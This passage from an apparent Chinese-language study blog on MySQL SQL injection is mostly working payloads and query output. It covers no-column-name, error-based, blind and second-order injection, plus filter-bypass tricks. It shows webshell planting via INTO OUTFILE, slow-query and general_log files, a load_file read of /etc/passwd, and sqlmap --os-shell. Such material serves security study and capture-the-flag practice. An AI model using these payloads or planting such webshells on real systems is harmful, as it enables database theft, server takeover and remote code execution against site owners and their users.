test)a;</span><br></pre></td></tr></table></figure><blockquote><p>其中**<code>2</code>用反引号是为了标识列名，如果不标识则2只是一个数字字面量而不是列名会报错，也可以<code>a.2</code>标识列<strong>，而</strong>a是对子查询的一个命名，可以为任意字符但不能没有**</p></blockquote><p><img src="/archives/ef8ae29c/QQ20250110-193623.png"></p><p>而多数情况&#96;会被过滤。当 &#96;&#96;不能使用的时候，可使用<strong>别名</strong>来代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2 as b union select * from test)a;</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250110-194128.png"></p><p>同样我们可以查多个列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(`1`,0x2d,`2`) from(select 1,2 union select * from test)</span><br><span class="line">a;</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250110-194236.png"></p><p>所以我们可通过该方法查到任意想要的字段值，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a,b from posts where a=-1 union select 1,(select concat(`3`,0x2d,`4`) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</span><br></pre></td></tr></table></figure></li><li><h4 id="join、using"><a href="#join、using" class="headerlink" title="join、using"></a>join、using</h4><p>join用于合并两个表，using表示使用什么字段进行连接，用using指定了连接字段则查询结果只返回连接字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from test a join test b)c;</span><br></pre></td></tr></table></figure><p>原理是用 join 连接两张表时, <strong>遇到重复的列名会报错, 并把这个报错的列名显示出来</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from (select * from test a join test b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;a&#x27;</span><br><span class="line">mysql&gt; select * from (select * from test a join test b using(a))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;b&#x27;</span><br></pre></td></tr></table></figure><p>通过 using 可以<strong>声明连接时的关联条件</strong>, 类似于平常写 inner join 时候的 <strong><code>on a.id = b.id</code></strong>, 这样就可以<strong>避免该字段重复而报错</strong></p><p>这里设置别名的时候省略了 <code>as</code>, 完整的写法如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select * from users as a join users as b) as c</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250110-203658.png"></p><p>而join在连接不同表时不需要用别名，因为两张表本身就不一样，但是我们把test自身连接就需要设置别名以对两张表进行区分，否则会报错</p><p>这里有三种利用，union第一种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from emails where id=1 union select * from (select * from users a join users b)c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line">mysql&gt; select * from emails where id=1 union select * from (select * from users a join users b using(id))c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure><p>union第二种，需要知道字段数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from emails where id=1 union select 1,(select * from (select * from users a join users b)c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line">mysql&gt; select * from emails where id=1 union select 1,(select * from (select * from users a join users b using(id))c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure><p>直接用 and 连接, 不使用 union</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from emails where id=1 and (select * from (select * from users a join users b)c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line">mysql&gt; select * from emails where id=1 and (select * from (select * from users a join users b using(id))c);</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br></pre></td></tr></table></figure></li><li><h4 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h4><p>order by对结果进行排序：0-9 a-z，不区分大小写</p><p>本质上是利用 order by 按字母顺序排序的特点, 如果我们<strong>输入的数据前几位符合 password 的内容, 会优先显示我们的数据</strong>, 如果输入的数据不符合的话, 就会显示原本的数据 (也可以加上 asc desc 改一下显示顺序)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from test where a=&#x27;111&#x27; union select 1,&#x27;111111&#x27; order by 2;</span><br><span class="line"></span><br><span class="line">select * from test where a=&#x27;111&#x27; union select 1,&#x27;1111112&#x27; order by 2;</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250110-203316.png"></p></li><li><h4 id="ascii比较盲注"><a href="#ascii比较盲注" class="headerlink" title="ascii比较盲注"></a>ascii比较盲注</h4><p>利用 mysql 比较字符时会转换成 ascii 的特性来进行盲注</p><p>原理就是利用字符串单个字符依次比较：</p><p><img src="/archives/ef8ae29c/QQ20250110-205013.png"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;1&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;111111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;1111111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from test where a=&#x27;111&#x27; and (select &#x27;111&#x27;,&#x27;11111111&#x27;)&gt;(select * from test limit 0,1);</span><br><span class="line">+-----+---------+</span><br><span class="line">| a   | b       |</span><br><span class="line">+-----+---------+</span><br><span class="line">| 111 | 1111111 |</span><br><span class="line">+-----+---------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250110-205612.png"></p><p>也可以比较字符串，但该方法有个缺点，就是列名是<code>id username password</code>，如果想猜出password的内容，就要把id和username猜出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(select 1,2,3)&gt;(select * from users limit 0,1); # 第一个位置先猜 id</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">(select 1,&#x27;Dumb&#x27;,3)&gt;(select * from users limit 0,1); # 第二个位置再猜 username</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">(select 1,&#x27;Dumb&#x27;,&#x27;Dumb&#x27;)&gt;(select * from users limit 0,1); # 第三个位置才能猜 password</span><br></pre></td></tr></table></figure></li></ul><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>利用条件：知道数据库中的列名且后端使用了<code>magic_quotes_gpc</code>等转移函数对引号过滤</p><p>原理就是在我们进行SQL注入时，后端仅仅使用了addslashes()或者magic_quotes_gpc()等转义函数对字符进行了转义，但存入数据库时存入的数据依然是原来的数据，且数据库对存入数据十分信任，下次取出时毫无保留的取出从而引发安全问题。</p><p>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>这时我们传入数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&#x27;#</span><br></pre></td></tr></table></figure><p>虽然会被转义，但传入数据库后数据就为<code>admin&#39;#</code>，当下次我们登录时<code>admin&#39;#</code>就会直接取出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&#x27;admin&#x27;#&#x27; and password=&#x27;$password&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>从而实现二次注入</p><h2 id="mysql-getshell"><a href="#mysql-getshell" class="headerlink" title="mysql getshell"></a>mysql getshell</h2><h3 id="获取网站根目录"><a href="#获取网站根目录" class="headerlink" title="获取网站根目录"></a>获取网站根目录</h3><ul><li>phpinfo()：直接显示web路径</li><li>web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径（单引号、参数报错）</li><li>一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以猜测默认路径或者通过查看数据库保存的路径、配置文件等</li><li>搜索引擎、利用其他漏洞、中间件错误解析等</li></ul><h3 id="into-outfile写shell"><a href="#into-outfile写shell" class="headerlink" title="into outfile写shell"></a>into outfile写shell</h3><p>利用条件：</p><ul><li><p><strong>secure_file_priv为空</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;</span><br></pre></td></tr></table></figure><blockquote><p><strong>secure_file_priv &#x3D; 任意路径读写</strong><br><strong>secure_file_priv &#x3D; path 只能在该指定路径下读写</strong><br><strong>secure_file_priv &#x3D; null 不能读写</strong></p></blockquote></li><li><p><strong>具有写入文件权限</strong></p></li><li><p><strong>知道网站绝对路径</strong></p></li></ul><p><code>into outfile</code>与<code>into dumpfile</code>用法一样，都能够写文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[CMD]); ?&gt;&#x27; into outfile &#x27;\/var\/www\/html\/shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>load_file()函数读取文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-2 union select 1, 2, 3, load_file(&#x27;//etc//passwd&#x27;), 5</span><br></pre></td></tr></table></figure><h3 id="慢日志写shell"><a href="#慢日志写shell" class="headerlink" title="慢日志写shell"></a>慢日志写shell</h3><p>慢日志：一般都是通过long_query_time选项来设置时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。</p><p>前提：</p><ul><li><strong>root权限</strong></li><li><strong>网站的绝对路径且具有写入权限</strong></li></ul><p>查看服务器默认时间值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%long_query_time%&#x27;</span><br><span class="line">show global variables like &#x27;%long%&#x27;</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250419-164739.png"></p><p>查看慢日志参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%slow%&#x27;</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250419-165029.png"></p><p>慢日志参数修改getshell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1  #打开慢日志</span><br><span class="line">set global slow_query_log_file=&#x27;D:\\phpStudy\\WWW\\shell.php&#x27;  #设置慢日志路径，注意：一定要用双反斜杠</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[a]);?&gt;&#x27; or sleep(11)  #这儿11是超过慢日志的10秒时间</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250419-165553.png"></p><h3 id="general-log全局日志写shell"><a href="#general-log全局日志写shell" class="headerlink" title="general_log全局日志写shell"></a>general_log全局日志写shell</h3><p><strong>利用前提</strong>：</p><ul><li><p><strong>root权限</strong></p></li><li><p><strong>网站的绝对路径且具有写入权限</strong></p></li></ul><p><strong>相关参数</strong>：</p><ul><li><p><code>general_log</code>：控制是否启用通用查询日志（记录所有客户端执行的SQL语句）。</p></li><li><p><code>log_output</code>：指定通用查询日志的输出方式，支持两种模式</p><ul><li><code>FILE</code>：日志写入文件（默认值）。</li><li><code>TABLE</code>：日志存入<code>mysql.general_log</code>系统表。</li><li><code>FILE,TABLE</code>：同时输出到文件和数据表。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL log_output = &#x27;FILE&#x27;;   -- 仅文件</span><br><span class="line">SET GLOBAL log_output = &#x27;TABLE&#x27;;  -- 仅表</span><br><span class="line">SET GLOBAL log_output = &#x27;FILE,TABLE&#x27;; -- 同时输出</span><br></pre></td></tr></table></figure></li><li><p><code>general_log_file</code>：定义通用查询日志文件的存储路径（仅当<code>log_output</code>包含<code>FILE</code>时生效）。</p></li></ul><p><strong>原理</strong>：开启<strong>general_log</strong>后，系统将mysql执行的每一条查询语句写入我们<strong>指定位置的文件</strong>里。而文件的位置则由<strong>general_log_file</strong>确定。我们可以开启这个选项后，执行<code>SELECT &#39;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#39;;</code>，这个指令就把木马插入到我们指定的php文件中去了。</p><p><strong>利用</strong>：</p><p>开启日志功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;general_log&#x27;;   # 查看日志是否开启</span><br><span class="line">set global general_log=on;   # 开启日志功能</span><br></pre></td></tr></table></figure><p>设置日志输出类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;log_output&#x27;;</span><br><span class="line">set global log_output=&#x27;file&#x27;;</span><br></pre></td></tr></table></figure><p>设置日志保存位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;general_log_file&#x27;;</span><br><span class="line">set global general_log_file=&#x27;D:/phpStudy/WWW/shell.php&#x27;;</span><br></pre></td></tr></table></figure><p>写shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure><h3 id="sqlmap-–os-shell写shell"><a href="#sqlmap-–os-shell写shell" class="headerlink" title="sqlmap –os-shell写shell"></a>sqlmap –os-shell写shell</h3><p>原理就是利用sqlmap通过into outfile向服务器写入两个文件，一个可以直接执行命令，一个进行文件上传。</p><p>条件：</p><ul><li><strong>要求为数据库DBA，使用<code>--is-dba</code>查看当前网站连接的数据库账号是否为mysql user表中的管理员如root，是则为dba</strong></li><li><strong>secure_file_priv没有具体值</strong></li><li><strong>知道网站的绝对路径</strong></li></ul><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=1 --os-shell</span><br></pre></td></tr></table></figure><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="information-schema过滤绕过"><a href="#information-schema过滤绕过" class="headerlink" title="information_schema过滤绕过"></a>information_schema过滤绕过</h3><p>在注入时，infromation_schema库的作用是获取<code>table_schema、table_name、column_name</code>这些数据库内的信息。</p><p>而一些题会将<strong>or过滤</strong>使我们查表时无法使用<code>information_schema</code>，而往往这种题型都需要将<code>information_schema</code>替换并配合无列名注入来得到flag</p><h4 id="InnoDB-引擎表"><a href="#InnoDB-引擎表" class="headerlink" title="InnoDB 引擎表"></a>InnoDB 引擎表</h4><ul><li><p><strong>mysql.innodb_table_stats: 存储 InnoDB 表的统计信息。</strong></p></li><li><p><strong>mysql.innodb_index_stats: 存储 InnoDB 索引的统计信息。</strong><br><strong>这两个表会记录表和索引的信息，日志会定期更新。</strong></p></li><li><p><strong>MySQL 5.6 及以上版本</strong></p><p>可以使用<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_table_index</code>这两张表来替换information_schema.tables实现注入，但是<strong>缺点是没有列名</strong>，所以常配合无列名注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,(select group_concat(database_name) from mysql.innodb_table_stats)%23</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())%23</span><br></pre></td></tr></table></figure></li></ul><h4 id="sys库"><a href="#sys库" class="headerlink" title="sys库"></a>sys库</h4><p>在<strong>MySQL 5.7中，新增了sys系统数据库</strong>，通过这个库可以快速地了解系统的元数据信息。sys库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。</p><p>sys库下有两种表：</p><ul><li><strong>字母开头： 适合人阅读，显示是格式化的数；</strong></li><li><strong><code>x$</code>开头 ： 适合工具采集数据，原始类数据；</strong></li></ul><p>下面是sys库中可以代替<code>infromation_schema</code>注入作用的视图：</p><ul><li><p><strong><code>sys.schema_auto_increment_columns</code></strong> 对表自增ID的监控，用于保存那些有自增字段的表的数据库相关信息。缺点是依然无法查询指定数据库某表的列</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_auto_increment_columns;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_auto_increment_columns where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer</code></strong></p><p>前面的<code>schema_auto_increment_columns</code>对应的是存在自增列的表，但是针对不存在自增列的表的话可以通过这两个视图来实现查询。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_table_statistics_with_buffer;</span><br><span class="line">select table_schema from sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br><span class="line">select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="比较符号-、过滤绕过"><a href="#比较符号-、过滤绕过" class="headerlink" title="比较符号=、&lt;、&gt;过滤绕过"></a>比较符号<code>=</code>、<code>&lt;</code>、<code>&gt;</code>过滤绕过</h3><h4 id="in"><a href="#in" class="headerlink" title="in()"></a>in()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(select database(),1,1)) in(115);</span><br><span class="line">//根据回显判断</span><br></pre></td></tr></table></figure><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><p>可利用like模糊查询代替<code>=</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(select database(),1,1)) like &#x27;s%&#x27;;</span><br></pre></td></tr></table></figure><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select database() regexp &#x27;^s&#x27;; </span><br><span class="line">//根据回显判断</span><br></pre></td></tr></table></figure><h4 id="greatest-least"><a href="#greatest-least" class="headerlink" title="greatest()&#x2F;least()"></a>greatest()&#x2F;least()</h4><p><strong>greatest (n1, n2, n3…)</strong>: 返回 n 中的最大值</p><p><strong>least (n1,n2,n3…)</strong>: 返回 n 中的最小值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and greatest(ascii(substr(username,1,1)),1)=116</span><br><span class="line">#这里的 greatest(查询，1）是用与比较取出其中最大的值用于爆破</span><br><span class="line">#如果任何给定值为NULL，则返回NULL。否则，它将返回最大值。</span><br></pre></td></tr></table></figure><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p>**strcmp(str1,str2)**：比较两个字符串，如果这两个字符串相等返回0，如果第一个参数是根据当前的排序小于第二个参数顺序返回-1，否则返回1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from users where id=1 and strcmp(asci(substr(username,1,1)),117)</span><br></pre></td></tr></table></figure><h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p>%09(制表符), %0a(换行), %0b(垂直制表符), %0d(回车), %a0(不间断空格)都能代替空格</p><h4 id="注释符代替"><a href="#注释符代替" class="headerlink" title="注释符代替"></a>注释符代替</h4><p>注释替换空格：<code>/**/</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1/**/and/**/1=1</span><br></pre></td></tr></table></figure><h4 id="括号嵌套"><a href="#括号嵌套" class="headerlink" title="括号嵌套"></a>括号嵌套</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(group_concat(table_name))from(information_schema.tables)where(tabel_schema=database());</span><br></pre></td></tr></table></figure><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union(select`table_name`,`table_type`from`information_schema`.`tables`);</span><br></pre></td></tr></table></figure><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>适用于对于大小写不敏感：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And</span><br></pre></td></tr></table></figure><h3 id="Or-and-xor-not绕过"><a href="#Or-and-xor-not绕过" class="headerlink" title="Or and xor not绕过"></a>Or and xor not绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">And == &amp;&amp;</span><br><span class="line">Or == ||</span><br><span class="line">Xor = |</span><br><span class="line">Not = !</span><br></pre></td></tr></table></figure><p>也可采用异或注入进行盲注：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select (substr(database(),1,1)=&#x27;s&#x27;) ^ 0 --</span><br></pre></td></tr></table></figure><p>or被过滤可采用无列名注入</p><h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p>mysql中的注释符：</p><ul><li>单行注释：<code>--+</code>、<code>-- </code>、<code>#</code></li><li>多行注释：<code>/*多行注释内容*/</code></li></ul><p>注释符常起到闭合单引号、多单引号、双引号等功能</p><h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><ul><li><p><strong>if（）&#x3D;&gt; case…when..then…else…end</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span><br><span class="line">=</span><br><span class="line">0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</span><br></pre></td></tr></table></figure></li><li><p><strong>hex()、bin()&#x3D;&#x3D;&gt;ascii()</strong></p></li><li><p><strong>sleep()等价</strong>：</p><p><strong>benchmark():</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(5)  //5秒</span><br><span class="line">benchmark(10000000,sha(1))  //2.79秒</span><br></pre></td></tr></table></figure><p><strong>笛卡尔积</strong>：</p><p>笛卡尔积是指两个集合中所有可能的行组合，通过利用笛卡尔积计算大量数据从而导致时间延迟的效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=1, (SELECT COUNT(*) FROM tableA, tableB, tableC), 0) --</span><br></pre></td></tr></table></figure><p><strong>GET_LOCK:</strong></p><p><code>GET_LOCK(str, timeout)</code>是MySQL的锁管理函数,通过竞争锁机制间接实现时间差判断</p><p>其中：</p><p><strong>str</strong>：锁名称（字符串，唯一标识）。</p><p><strong>timeout</strong>：尝试获取锁的最大等待时间（秒）。</p><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 1),1,1))=65, GET_LOCK(&#x27;injection_lock&#x27;,5), 0) --</span><br></pre></td></tr></table></figure><blockquote><p>攻击者首次注入时，尝试获取锁<code>injection_lock</code>，设置超时时间为5秒。</p></blockquote><p>当条件为真时当前会话会尝试获取锁，若锁已被占用则会阻塞5秒。</p><p>所以要达到延迟的效果我们需要一开始获取锁，使其被占用从而延迟：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and get_lock(&#x27;injection_lock&#x27;,1)--</span><br></pre></td></tr></table></figure><p><strong>RLIKE:</strong></p><p>**RPAD(str, len, padstr)**：用于将字符串填充到指定长度。</p><p><strong>repeat</strong>：重复一个字符串指定次数。</p><p><strong>RLIKE</strong>：用于正则表达式匹配</p><p>原理就是<code>rpad</code>或<code>repeat</code>构造长字符串，加以计算量大的pattern，通过repeat的参数可以控制延时长短。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p><code>.*</code>贪婪匹配，会尽可能匹配更多字符。</p></blockquote><p><code>repeat(&#39;(a.\*)+&#39;, 30)</code>生成正则表达式片段 <code>(a.\*)+</code>重复30次后再追加字符b，形成完整正则表达式，当匹配时会尝试匹配所有字符找b从而达到时间延迟</p></li><li><p><strong>concat_ws()&#x3D;&#x3D;&gt;group_concat()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(database());</span><br><span class="line">=</span><br><span class="line">select concat_ws(1,database());</span><br></pre></td></tr></table></figure></li><li><p>mid()、substr()&#x3D;&#x3D;&gt;substring() 